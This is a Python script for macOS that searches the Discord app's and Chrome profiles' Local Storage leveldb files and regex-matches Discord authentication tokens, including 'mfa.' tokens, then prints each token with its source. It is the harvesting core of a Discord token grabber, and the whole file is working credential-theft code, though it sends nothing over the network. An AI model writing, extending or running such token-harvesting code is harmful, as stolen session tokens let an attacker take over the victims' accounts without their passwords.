import os
import re

from sys import platform
if platform != "darwin":
    input("WARNING: This program is only supported for macOS \nThere is no gaurantee on the functionality of this program on this device. \nPress enter to continue")


class Token:
    def __init__(self, token, platform):
        self.token = token
        self.platform = platform


    def __str__(self):
        return self.token


class TokenFinder:
    def __init__(self):
        tokens = []
        appdata = f"/Users/{os.getlogin()}/Library/Application Support/"

        paths = {
        'Discord': appdata + 'discord',
        }

        for profile in self.get_google_profiles(appdata):
            paths["Google Chrome"] = profile

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue
            for token in self.extract_tokens(path):
                tokens.append(Token(token, platform))

        self.tokens = tokens


    @staticmethod
    def extract_tokens(path):
        path += "/Local Storage/leveldb"
        tokens = []

        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            for line in [x.strip() for x in open(f'{path}/{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens


    @staticmethod
    def get_google_profiles(appdata):
        path = appdata + "Google/Chrome/"
        profiles = []

        for file in os.listdir(path):
            if file.startswith("Profile"):
                profiles.append(path+file)

        return profiles


    def to_list(self):
        return [token.token for token in self.tokens]


    def display(self):
        message = ""
        if len(self.to_list()) == 0:
            message += "No tokens found"
        else:
            message += f"Found {len(self.to_list())} tokens:"
            for token in self.tokens:
                message += "\n"
                message += f"{token.platform}: {token}"

        return message


if __name__ == "__main__":
    tokens = TokenFinder()
    print(tokens.display())
